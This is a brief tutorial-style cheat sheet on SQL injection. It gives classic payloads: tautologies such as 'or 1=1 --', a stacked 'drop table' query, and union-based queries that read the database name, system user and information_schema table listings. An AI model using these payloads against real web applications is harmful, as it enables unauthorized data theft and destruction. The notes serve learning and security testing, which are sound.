# SQLinjection  
SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
Remember, practice makes perfect!   
  
### Basic injection  
select password from users where name = '$id';  
So, what can we insert into $id?  
```  
5566 or 1=1 --  
5566; drop table hello  // execute drop table on second line
rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
rafael' or ''='    // select password from users where name = 'rafael' pr ''=''; 
```  
  
### Union based  
Try on terminal what will **SELECT name, password FROM users WHERE id = 1 UNION SELECT 1, 2** happen?  
Ans: The union result will show as second result with matching column of name and password!  
Therefore, if we just want the info we need, we can make the first clause not exist...  
```
select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
// what can we use on 1, 2?  
select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
// we can even get other table names by information schema!  
... union select table_name, column_name from information_schema.columns;
// so many data, we can use with **limit**  
... union select table_name, column_name from information_schema.columns limit 1, 1;    // get data from index 2 with count of 1
```
